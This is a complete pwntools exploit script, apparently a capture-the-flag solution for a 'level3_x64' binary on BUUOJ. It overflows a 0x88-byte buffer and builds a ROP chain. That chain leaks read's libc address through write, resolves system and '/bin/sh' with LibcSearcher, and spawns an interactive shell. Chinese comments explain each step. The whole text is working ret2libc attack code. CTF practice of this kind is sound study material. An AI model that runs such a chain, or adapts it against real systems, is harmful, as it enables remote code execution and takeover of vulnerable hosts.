#!/usr/bin/python2
#coding=utf-8
from pwn import *
from LibcSearcher import *

context(os = "linux", arch = "amd64", log_level= "debug")
p = process('./level3_x64')
#p = remote("node3.buuoj.cn", 25360)
elf = ELF("./level3_x64")

read_got = elf.got["read"]
write_plt = elf.plt["write"]
main_addr = elf.symbols["main"]
pop_rdi_ret = 0x4006b3
pop_rsi_r15_ret = 0x4006b1

payload = "a" * 0x88
payload += p64(pop_rdi_ret) + p64(1)                        #设置write第一个参数为1
payload += p64(pop_rsi_r15_ret) + p64(read_got) + p64(0)    #设置write第二个参数为read_got
payload += p64(write_plt)                                   #调用write函数
payload += p64(main_addr)                                   #调用完write返回主函数
p.sendlineafter("Input:", payload)

read_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))  #接收泄露的read函数的真实地址
libc = LibcSearcher("read", read_addr)
libc_base = read_addr - libc.dump("read")
system_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")

payload = "a" * 0x88
payload += p64(pop_rdi_ret) + p64(binsh_addr)
payload += p64(system_addr)
p.sendlineafter("Input:", payload)

p.interactive()

